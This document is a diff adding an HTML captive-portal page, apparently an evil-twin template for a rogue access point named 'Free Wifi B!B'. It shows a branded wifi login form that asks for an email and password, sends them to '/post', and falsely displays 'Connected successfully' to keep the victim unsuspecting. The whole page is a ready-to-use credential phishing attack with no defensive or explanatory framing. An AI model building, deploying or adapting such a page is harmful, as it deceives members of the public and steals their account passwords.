@@ -1,0 +1,167 @@
+<!-- AP="Free Wifi B!B" -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>B!B Wifi free</title>
+  <title>veuillez vous connectez</title>
+  <meta charset='UTF-8'>
+  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+  <style>
+    a:hover{
+      text-decoration: underline;
+    }
+    body{
+      font-family: Arial, sans-serif;
+      align-items: center;
+      justify-content: center;
+      background-color: #CCCCCC; /* Fond externe gris */
+    }
+    input[type='text'], input[type='password']{
+      background-color: rgb(250,250,250);
+      width: 100%;
+      padding: 12px 10px;
+      margin: 8px 0;
+      box-sizing: border-box;
+      border: 1px solid #cccccc;
+      border-radius: 3px;
+    }
+    .container{
+      margin: auto;
+      padding: 20px;
+      max-width: 700px;
+    }
+    .logo-container{
+      text-align: center;
+      margin-bottom: 30px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .logo{
+      width: 40px;
+      height: 40px;
+      fill: #FFC72C;
+      margin-right: 100px;
+    }
+    .company-name{
+      font-size: 42px;
+      color: black;
+      margin-left: 0px;
+    }
+    .form-container{
+      background: #FFFFFF;
+      border: 1px solid #CEC0DE;
+      border-radius: 4px;
+      padding: 20px;
+      box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);
+    }
+    h1{
+      text-align: center;
+      font-size: 28px;
+      font-weight: 500;
+      margin-bottom: 20px;
+    }
+    .input-field{
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #BEABD3;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      font-size: 14px;
+    }
+    .submit-btn{
+      background: #F81A42; /* Couleur du bouton */
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-size: 0.875rem;
+      width: 100%;
+    }
+    .submit-btn:hover{
+      background: #F81A42; /* Couleur du bouton au survol (identique ici) */
+    }
+    .containerlogo{
+      padding-top: 25px;
+    }
+    .containertitle{
+      color: #202124;
+      font-size: 24px;
+      padding: 15px 0px 10px 0px;
+    }
+    .containersubtitle{
+      color: #202124;
+      font-size: 16px;
+      padding: 0px 0px 30px 0px;
+    }
+    .containerbtn{
+      display: flex;
+      justify-content: end;
+      padding: 30px 0px 25px 0px;
+    }
+    div#form-block{
+      min-height: 150px;
+    }
+    div#success-block{
+      display: none;
+      text-align: center;
+      min-height: 100px;
+      margin-bottom: 30px;
+      justify-content: center;
+      align-items: center;
+    }
+    @media screen and (min-width: 768px){
+      .logo{
+        max-width: 80px;
+        max-height: 80px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class='container'>
+    <div class='logo-container'>
+      <?xml version='1.0' standalone='no'?>
+      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>
+    </div>
+    <div class=form-container>
+      <center>
+      <div class='containerlogo'>
+          <img data-testid=accessibleImg class="___1v417w0 f2rbwfs frvgh55" src="data:image/png;base64,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" alt="Logo B!B Wifi">
+      </div>
+      </center>
+      <div id='form-block'>
+        <center>
+          <div class='containertitle'></div>
+          <div class='containersubtitle'>Log in to access internet</div>
+        </center>
+        <form action='/post' id='login-form'>
+          <input name='email' class='input-field' type='text' placeholder='email' required>
+          <input name='password' class='input-field' type='password' placeholder='Password' required />
+          <div class='containerbtn'>
+            <button id=submitbtn class=submit-btn type=submit style="background-color: #F81A42;">Log in</button>
+          </div>
+        </form>
+      </div>
+      <div id='success-block'>
+        <center>
+          <div>Connected successfully. </br>You will be redirected shortly.</div>
+        </center>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      document.getElementById('success-block').style.display = 'flex';
+      document.getElementById('form-block').style.display = 'none';
+
+      setTimeout(function() {
+        document.getElementById('login-form').submit();
+      }, 3000);
+    });
+  </script>
+</body>
+</html>
